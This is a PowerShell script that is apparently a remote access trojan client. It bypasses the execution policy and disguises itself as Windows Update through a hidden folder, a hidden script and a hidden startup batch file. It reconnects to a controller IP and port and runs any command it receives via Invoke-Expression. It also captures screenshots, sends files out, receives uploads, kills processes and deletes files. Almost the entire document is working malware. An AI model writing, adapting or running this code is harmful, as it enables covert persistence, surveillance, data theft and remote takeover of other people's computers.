# Set execution policy for current process only
if ((Get-ExecutionPolicy -Scope Process) -ne 'Bypass') {
    try {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
    } catch {
        Write-Error "Failed to set execution policy: $_"
        exit 1
    }
}

# First section - persistence setup
try {
    # Create temp script with current content
    $scriptContent = @'
    # Script content will be replaced here
'@
    
    # Use user's AppData folder and construct full paths
    $persistPath = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\WindowsUpdate"
    $scriptPath = Join-Path $persistPath "services.ps1"
    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    $batPath = Join-Path $startupPath "WindowsUpdate.bat"

    # Create directory structure recursively
    if (-not (Test-Path $persistPath)) {
        New-Item -ItemType Directory -Path $persistPath -Force -ErrorAction Stop | Out-Null
    }

    # Create or update script file
    if (-not (Test-Path $scriptPath) -or -not (Get-Content $scriptPath -Raw)) {
        # For IRM execution, use current script content
        if ($MyInvocation.MyCommand.Path) {
            Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
        } else {
            # For IRM, get script content from memory
            $currentScript = $scriptContent
            if (-not $currentScript) {
                $currentScript = $MyInvocation.MyCommand.ScriptBlock.ToString()
            }
            Set-Content -Path $scriptPath -Value $currentScript -Force
        }
    }

    # Create batch file with error handling
    $batContent = @"
@echo off
PowerShell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath" 
exit
"@
    [System.IO.File]::WriteAllText($batPath, $batContent)

    # Hide files with validation
    if (Test-Path $scriptPath) { (Get-Item $scriptPath -Force).Attributes = 'Hidden' }
    if (Test-Path $batPath) { (Get-Item $batPath -Force).Attributes = 'Hidden' }
    if (Test-Path $persistPath) { (Get-Item $persistPath -Force).Attributes = 'Hidden' }

    # Start hidden if not already running from persist location
    if (-not $MyInvocation.MyCommand.Path -or -not $MyInvocation.MyCommand.Path.Contains("services.ps1")) {
        Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
        exit
    }

} catch {
    Write-Warning "Persistence setup failed: $_"
}

$server_ip = "192.168.100.6"  # Replace with the server's IP address
$server_port = 4455        # Replace with the server's listening port

# Check for admin privileges at start
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Warning "Not running with administrative privileges. Some operations may fail."
}

# Add this at the beginning after the imports
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Function to establish a TCP connection
function Connect-ToServer {
    param (
        [string]$server_ip,
        [int]$server_port
    )
    
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient
            $client.SendTimeout = 30000
            $client.ReceiveTimeout = 30000
            
            Write-Host "Attempting to connect to $server_ip on port $server_port..."
            $result = $client.BeginConnect($server_ip, $server_port, $null, $null)
            $success = $result.AsyncWaitHandle.WaitOne(5000) # 5 second timeout
            
            if (!$success) {
                throw "Connection attempt timed out"
            }
            
            $client.EndConnect($result)
            
            if (!$client.Connected) {
                throw "Connection failed"
            }
            
            $stream = $client.GetStream()
            Write-Host "Connected successfully to $server_ip on port $server_port"
            
            # Send hostname as username
            $hostname = [System.Net.Dns]::GetHostName()
            $computerName = $env:COMPUTERNAME
            $username = "$computerName\$env:USERNAME"
            
            # Wait for whoami command
            $buffer = New-Object byte[] 1024
            $read = $stream.Read($buffer, 0, $buffer.Length)
            $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
            
            if ($command.Trim() -eq "whoami") {
                $stream.Write([System.Text.Encoding]::UTF8.GetBytes($username), 0, $username.Length)
            }
            
            return $client, $stream
            
        } catch {
            Write-Host "Connection failed: $_"
            if ($client) {
                $client.Close()
                $client.Dispose()
            }
            Write-Host "Retrying in 5 seconds..."
            Start-Sleep -Seconds 5
        }
    }
}

# Function to handle the connection
function Handle-Connection {
    param (
        [System.Net.Sockets.TCPClient]$client,
        [System.IO.Stream]$stream
    )

    # Buffer to read incoming data
    $buffer = New-Object byte[] 1024
    $last_activity = Get-Date
    $connection_timeout = 30  # 30 seconds timeout

    while ($true) {
        try {
            # Test connection status
            if (-not $client.Connected -or ($client.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead) -and $client.Client.Available -eq 0)) {
                throw "Client disconnected"
            }

            if ($client.Available -gt 0) {
                $bytes_read = $stream.Read($buffer, 0, $buffer.Length)
                if ($bytes_read -eq 0) { 
                    throw "Connection closed" 
                }

                # Add command validation
                try {
                    $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytes_read).Trim()
                    
                    # Modified command validation
                    if ($command.StartsWith('$b64 = @"') -or 
                        $command.StartsWith('$bytes = [Convert]::FromBase64String') -or 
                        $command.StartsWith('[IO.File]::WriteAllBytes') -or 
                        $command.StartsWith('$global:uploadBytes') -or
                        $command.StartsWith('try {') -or  # Allow PowerShell try blocks
                        $command.StartsWith('Set-Location') -or  # Allow Set-Location commands
                        $command -eq 'dir' -or  # Allow basic commands
                        $command -eq "(Get-Location).Path") {  # Allow path queries
                        # Skip validation for special commands
                        $last_activity = Get-Date
                    }
                    # More permissive validation for PowerShell commands
                    elseif (-not ($command -match '^[\x20-\x7E\r\n\s]*$')) {  # Allow all printable ASCII
                        throw "Invalid command format - contains disallowed characters"
                    }
                    
                    $last_activity = Get-Date

                    # Rest of command handling...
                    if ($command -eq "echo ping") {
                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes("pong`n"), 0, 5)
                        $stream.Flush()
                        continue
                    }

                    if ($command.StartsWith("echo ping")) {
                        $stream.Write([System.Text.Encoding]::UTF8.GetBytes("pong`n"), 0, 5)
                        $stream.Flush()
                        continue
                    }

                    if ($command.ToLower() -eq "exit") {
                        # Close the connection if 'exit' command is received
                        Write-Host "[+] Closing connection..."
                        $stream.Close()
                        $client.Close()
                        break
                    }

                    # Execute the command
                    if ($command -eq "dir") {
                        try {
                            $items = @()
                            Get-ChildItem -Force -ErrorAction Continue | ForEach-Object {
                                try {
                                    $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                                } catch {
                                    # Skip items we can't access
                                }
                            }
                            $output = if ($items.Count -gt 0) {
                                $items -join "`n"
                            } else {
                                "No accessible items"
                            }
                        } catch {
                            $output = "[-] Error: $_"
                        }
                    } elseif ($command.StartsWith("Rename-Item")) {
                        # Handle file/folder renaming
                        try {
                            Invoke-Expression $command
                            $output = "OK"
                        } catch {
                            $output = "Error: $_"
                        }
                    } elseif ($command.StartsWith("Remove-Item")) {
                        # Handle file/folder deletion
                        try {
                            Invoke-Expression $command
                            $output = "OK"
                        } catch {
                            $output = "Error: $_"
                        }
                    } elseif ($command -eq "(Get-Location).Path") {
                        # Return current directory path
                        $output = (Get-Location).Path
                    } elseif ($command -eq "whoami") {
                        # Return current username
                        $output = $env:USERNAME
                    } elseif ($command.StartsWith("Set-Location")) {
                        try {
                            $path = $command -replace '^Set-Location -LiteralPath "(.*?)".*$', '$1'
                            $path = $path -replace '`"', '"'
                            
                            Set-Location -LiteralPath $path -ErrorAction Stop
                            
                            # List directory contents with better error handling
                            $items = @()
                            try {
                                Get-ChildItem -Force | ForEach-Object {
                                    try {
                                        $items += "$($_.Name)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                                    } catch {
                                        # Skip items we can't access
                                    }
                                }
                                $output = if ($items.Count -gt 0) {
                                    $items -join "`n"
                                } else {
                                    "No accessible items"
                                }
                            } catch {
                                $output = "Unable to list directory contents"
                            }
                        } catch {
                            $output = "[-] Error: $_"
                        }
                    } elseif ($command.StartsWith("Get-ChildItem -Path")) {
                        try {
                            # Get file list silently
                            $items = Invoke-Expression $command
                            $output = $items -join "`n"
                            $output += "||END"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
                            $stream.Flush()
                        } catch {
                            $errorMsg = "ERROR:" + $_.Exception.Message
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                        }
                        continue
                    } elseif ($command.StartsWith("Get-ChildItem -Recurse")) {
                        try {
                            $path = $command -replace 'Get-ChildItem -Recurse -LiteralPath "(.*)"', '$1'
                            if (-not (Test-Path -LiteralPath $path)) {
                                throw "Path not found: $path"
                            }
                            
                            $items = @()
                            Get-ChildItem -Recurse -LiteralPath $path -ErrorAction Stop | ForEach-Object {
                                try {
                                    $items += "$($_.FullName)|$($_.Length)|$($_.CreationTime)|$($_.LastWriteTime)|$($_.PSIsContainer)"
                                } catch {
                                    # Log access errors but continue
                                    Write-Warning "Cannot access item: $_"
                                }
                            }
                            
                            if ($items.Count -eq 0) {
                                throw "No accessible items found in directory"
                            }
                            
                            $output = $items -join "`n"
                            # Add clear end marker
                            $output += "`n`n"
                            
                        } catch {
                            $output = "ERROR: $_"
                        }
                        
                        # Ensure output is sent
                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                        $stream.Write($responseBytes, 0, $responseBytes.Length)
                        $stream.Flush()
                        continue
                    } elseif ($command.StartsWith("Get-Process")) {
                        try {
                            $processes = Get-Process | Select-Object ProcessName, Id, @{Name="CPU";Expression={$_.CPU}}, @{Name="Memory";Expression={[math]::Round($_.WorkingSet64/1MB, 2)}} | ForEach-Object {
                                "$($_.ProcessName)|$($_.Id)|$(if($_.CPU){[math]::Round($_.CPU,2)}else{0})|$($_.Memory)"
                            }
                            $output = $processes -join "`n"
                            if ([string]::IsNullOrEmpty($output)) {
                                $output = "No processes found"
                            }
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
                            $stream.Flush()
                        } catch {
                            $errorMsg = "[-] Error: $_"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                            $stream.Flush()
                        }
                        continue
                        
                    } elseif ($command.StartsWith("Stop-Process")) {
                        # Handle process termination
                        try {
                            Invoke-Expression $command
                            $output = "OK"
                        } catch {
                            $output = "[-] Error: $_"
                        }
                    } elseif ($command.StartsWith("Get-ChildItem")) {
                        try {
                            # Extract the path and clean it
                            $path = $command -match '"([^"]+)"' | Out-Null
                            $path = $Matches[1]
                            
                            if (-not (Test-Path -LiteralPath $path)) {
                                throw "Path not found: $path"
                            }
                            
                            # Get all items recursively
                            $items = Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
                                try {
                                    # Include full path, size, and whether it's a container (directory)
                                    "$($_.FullName)|$($_.Length)|$($_.PSIsContainer)"
                                } catch {
                                    $null
                                }
                            }
                            
                            # Send the list with a clear end marker
                            $output = ($items -join "`n") + "`r`n`r`n"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($output), 0, $output.Length)
                            $stream.Flush()
                        }
                        catch {
                            $errorMsg = "ERROR: $_"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                            $stream.Flush()
                        }
                        $output = ""

                    } elseif ($command -eq "Get-Screenshot") {
                        try {
                            # Capture screenshot
                            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $screenshot = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                            $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
                            $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
                            
                            # Convert to bytes
                            $ms = New-Object System.IO.MemoryStream
                            $screenshot.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                            $bytes = $ms.ToArray()
                            $ms.Close()
                            $graphics.Dispose()
                            $screenshot.Dispose()
                            
                            # Send size header
                            $size = $bytes.Length
                            $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$size|")
                            $stream.Write($sizeHeader, 0, $sizeHeader.Length)
                            $stream.Flush()
                            
                            # Send image data
                            $stream.Write($bytes, 0, $bytes.Length)
                            $stream.Flush()
                        }
                        catch {
                            $errorMsg = "ERROR: $_"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                            $stream.Flush()
                        }
                        $output = ""
                    } elseif ($command.StartsWith('$files = Get-ChildItem')) {
                        try {
                            # Execute command and send result
                            $result = Invoke-Expression $command
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
                            $stream.Flush()
                        } catch {
                            $errorMsg = "ERROR:" + $_.Exception.Message
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
                        }
                        continue

                    } elseif ($command.StartsWith('$bytes = [IO.File]::ReadAllBytes')) {
                        try {
                            # Execute command in smaller chunks
                            $result = Invoke-Expression $command
                            # Send size first
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($result + "`n"), 0, $result.Length + 1)
                            $stream.Flush()
                            Start-Sleep -Milliseconds 100  # Small delay to prevent data mixing
                        } catch {
                            $errorMsg = "ERROR:" + $_.Exception.Message
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg + "`n"), 0, $errorMsg.Length + 1)
                        }
                        continue

                    } elseif ($command.StartsWith("[IO.File]::ReadAllBytes")) {
                        try {
                            # Extract the file path and clean it
                            $path = $command -match '"([^"]+)"' | Out-Null
                            $filePath = $Matches[1]
                            
                            # Verify file exists and is accessible
                            if (-not (Test-Path -LiteralPath $filePath)) {
                                throw "File not found: $filePath"
                            }

                            # Get file info first
                            $fileInfo = Get-Item -LiteralPath $filePath
                            if ($fileInfo.Length -eq 0) {
                                throw "File is empty"
                            }

                            # Read file bytes safely
                            $bytes = [System.IO.File]::ReadAllBytes($filePath)
                            
                            # Send size header first and wait for acknowledgement
                            $sizeHeader = [System.Text.Encoding]::UTF8.GetBytes("SIZE:$($bytes.Length)|`n")
                            $stream.Write($sizeHeader, 0, $sizeHeader.Length)
                            $stream.Flush()
                            Start-Sleep -Milliseconds 100  # Small delay
                            
                            # Now send file data
                            $stream.Write($bytes, 0, $bytes.Length)
                            $stream.Flush()
                        } catch {
                            $errorMsg = [System.Text.Encoding]::UTF8.GetBytes("ERROR: $_")
                            $stream.Write($errorMsg, 0, $errorMsg.Length)
                            $stream.Flush()
                        }
                        continue
                    } elseif ($command.StartsWith("Get-ChildItem -Recurse -File")) {
                        try {
                            # Extract the path and clean it
                            $path = $command -match '"([^"]+)"' | Out-Null
                            $path = $Matches[1]
                            
                            if (-not (Test-Path -LiteralPath $path)) {
                                throw "Path not found: $path"
                            }
                            
                            # Get all files recursively
                            $files = Get-ChildItem -Recurse -File -Path $path -ErrorAction Stop | ForEach-Object {
                                $_.FullName
                            }
                            
                            $output = $files -join "`n"
                        } catch {
                            $output = "ERROR: $_"
                        }
                        
                        # Ensure output is sent
                        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                        $stream.Write($responseBytes, 0, $responseBytes.Length)
                        $stream.Flush()
                        continue
                    } elseif ($command.StartsWith("UPLOAD:")) {
                        try {
                            # Parse upload info
                            $uploadInfo = $command.Substring(7)  # Remove "UPLOAD:" prefix
                            $fileName, $fileSize = $uploadInfo -split '\|'
                            $fileSize = [int64]$fileSize
                            
                            # Send ready signal
                            $responseBytes = [System.Text.Encoding]::UTF8.GetBytes("READY")
                            $stream.Write($responseBytes, 0, $responseBytes.Length)
                            $stream.Flush()
                            
                            # Create file and prepare for writing
                            $filePath = Join-Path -Path (Get-Location).Path -ChildPath $fileName
                            $fileStream = [System.IO.File]::Create($filePath)
                            $totalReceived = 0
                            $buffer = New-Object byte[] 8192
                            
                            # Receive file data
                            while ($totalReceived -lt $fileSize) {
                                $bytesRead = $stream.Read($buffer, 0, [Math]::Min($buffer.Length, $fileSize - $totalReceived))
                                if ($bytesRead -eq 0) { break }
                                
                                $fileStream.Write($buffer, 0, $bytesRead)
                                $totalReceived += $bytesRead
                            }
                            
                            # Cleanup
                            $fileStream.Close()
                            $fileStream.Dispose()
                            
                            # Send success response
                            $responseBytes = [System.Text.Encoding]::UTF8.GetBytes("UPLOAD_SUCCESS")
                            $stream.Write($responseBytes, 0, $responseBytes.Length)
                            $stream.Flush()
                            
                            continue
                        }
                        catch {
                            if ($fileStream) {
                                $fileStream.Close()
                                $fileStream.Dispose()
                            }
                            $errorMsg = "UPLOAD_FAILED: $_"
                            $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                            $stream.Flush()
                            continue
                        }
                    } else {
                        $output = Invoke-Expression -Command $command 2>&1
                    }

                    # Convert output to byte array and send it back to the server
                    $output_bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
                    $stream.Write($output_bytes, 0, $output_bytes.Length)
                } catch {
                    $errorMsg = "Command validation error: $_"
                    $stream.Write([System.Text.Encoding]::UTF8.GetBytes($errorMsg), 0, $errorMsg.Length)
                    $stream.Flush()
                    continue
                }
            }
            else {
                # Add keepalive check
                $current_time = Get-Date
                if (($current_time - $last_activity).TotalSeconds -gt 10) {
                    try {
                        $client.Client.Send([byte[]]@(0), 0, 0)
                    } catch {
                        throw "Connection lost during keepalive"
                    }
                }
                Start-Sleep -Milliseconds 100
            }
        }
        catch {
            Write-Host "[-] Connection error: $_"
            
            # Cleanup
            if ($client) { 
                $client.Close()
                $client.Dispose()
            }
            if ($stream) {
                $stream.Close()
                $stream.Dispose()
            }

            Write-Host "Connection lost. Attempting to reconnect..."
            Start-Sleep -Seconds 5
            
            try {
                # Try to reconnect
                $client = New-Object System.Net.Sockets.TCPClient
                Write-Host "Attempting to connect to $server_ip on port $server_port..."
                $client.Connect($server_ip, $server_port)
                if ($client.Connected) {
                    $stream = $client.GetStream()
                    $last_activity = Get-Date
                    Write-Host "Successfully reconnected!"
                    continue
                }
            }
            catch {
                Write-Host "Reconnection failed: $_"
                Start-Sleep -Seconds 5
                continue
            }
        }
    }

    # Cleanup
    if ($client) { 
        $client.Close()
        $client.Dispose()
    }
    if ($stream) {
        $stream.Close()
        $stream.Dispose()
    }

    # Attempt to reconnect
    Write-Host "Attempting to reconnect..."
    Start-Sleep -Seconds 5
    $client, $stream = Connect-ToServer -server_ip $server_ip -server_port $server_port
    if ($client.Connected) {
        Write-Host "Reconnected successfully."
        Handle-Connection -client $client -stream $stream
    } else {
        Write-Host "Failed to reconnect. Exiting..."
    }
}

# Function to show success message
function Show-SuccessMessage {
    param (
        [string]$message
    )
    Add-Type -AssemblyName System.Windows.Forms
    $form = New-Object Windows.Forms.Form
    $form.Text = "Success"
    $form.Size = New-Object Drawing.Size(300, 150)
    $form.StartPosition = "CenterScreen"

    $label = New-Object Windows.Forms.Label
    $label.Text = $message
    $label.ForeColor = [System.Drawing.Color]::Black
    $label.AutoSize = $true
    $label.Location = New-Object Drawing.Point(50, 50)

    $form.Controls.Add($label)
    $form.ShowDialog()
}

# Main connection loop with improved reconnection
while ($true) {
    $shouldContinue = $false
    
    try {
        Write-Host "Attempting to connect to $server_ip on port $server_port..."
        $client, $stream = Connect-ToServer -server_ip $server_ip -server_port $server_port
        
        if ($client.Connected) {
            Write-Host "Connected to server. Handling connection..."
            Handle-Connection -client $client -stream $stream
        }
    }
    catch {
        Write-Host "Connection error: $_"
        $shouldContinue = $true
    }
    finally {
        # Cleanup
        if ($client) {
            try { 
                $client.Close() 
                $client.Dispose()
            } catch { }
        }
        if ($stream) {
            try { 
                $stream.Close() 
                $stream.Dispose()
            } catch { }
        }
        
        Write-Host "Connection lost. Waiting 5 seconds before reconnection attempt..."
        Start-Sleep -Seconds 5
    }
    
    # Continue loop outside the finally block
    if ($shouldContinue) {
        continue
    }
}
